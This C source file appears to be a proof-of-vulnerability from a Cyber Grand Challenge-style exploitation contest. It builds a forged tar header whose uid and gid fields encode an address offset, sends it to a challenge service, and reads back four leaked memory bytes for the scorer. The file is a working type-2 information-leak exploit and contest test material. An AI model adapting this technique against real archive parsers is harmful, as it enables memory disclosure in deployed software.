/*
 * Copyright (c) 2015 Kaprica Security, Inc.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */
#include <libpov.h>

#define BLOCK_SIZE 512
typedef struct glue_t glue_t;
struct glue_t
{
  char f_name[100];
  char f_mode[8];
  char uid[8];
  char gid[8];
  char f_size[12];
  char mtime[12];
  char chk_sum[8];
  char type[1];
  char l_name[100];
  char indicator[6];
  char version[2];
  char u_name[32];
  char g_name[32];
  char d_maj[8];
  char d_min[8];
  char f_prefix[100];
};


int main(void) {

  int base = 0x4347C000;
#if 1
  int pov_type = 2;
  int size = 0;
  int length = 0;
  length_read(0, NULL, 0x1000 / 4);

  // negotiate type 2
  transmit_all(3, &pov_type, sizeof(pov_type));

  if (length_read(3, (unsigned char *)&base, sizeof(base)) != sizeof(base))
  {
    return -1;
  }

  if (length_read(3, (unsigned char *)&size, sizeof(size)) != sizeof(size))
  {
    return -1;
  }

  if (length_read(3, (unsigned char *)&length, sizeof(length)) != sizeof(length))
  {
    return -1;
  }
#endif

  int ref = 0x0804d7a0;
  int offset = (base - ref);
  int gid = 256 + 512;
  int uid = offset / gid + 1;

  glue_t *block = malloc(sizeof(glue_t));
  memset(block, '\0', sizeof(glue_t));

  for (int i = 8 - 2; i >= 0; i--)
  {
    block->gid[i] = 0x30 + gid % 8;
    gid /= 8;
  }

  for (int i = 8 - 2; i >= 0; i--)
  {
    block->uid[i] = 0x30 + uid % 8;
    uid /= 8;
  }

  strcpy(block->f_name, "this is a test");
  strcpy(block->f_mode, "07000");
  strcpy(block->f_size, "0");

  char zero[BLOCK_SIZE] = {0};

  transmit_all(1, block, sizeof(glue_t));
  transmit_all(1, zero, BLOCK_SIZE - sizeof(glue_t));

  // 2 empty blocks
  memset(block, '\0', sizeof(glue_t));

  transmit_all(1, block, sizeof(glue_t));
  transmit_all(1, zero, BLOCK_SIZE - sizeof(glue_t));

  transmit_all(1, block, sizeof(glue_t));
  transmit_all(1, zero, BLOCK_SIZE - sizeof(glue_t));

  char leaked[4];
  length_read(0, (unsigned char *)zero, 4 * 22 - 1);
  length_read(0, (unsigned char *)leaked, sizeof(leaked));
  transmit_all(3, (unsigned char *)leaked, sizeof(leaked));

  return 0;
}
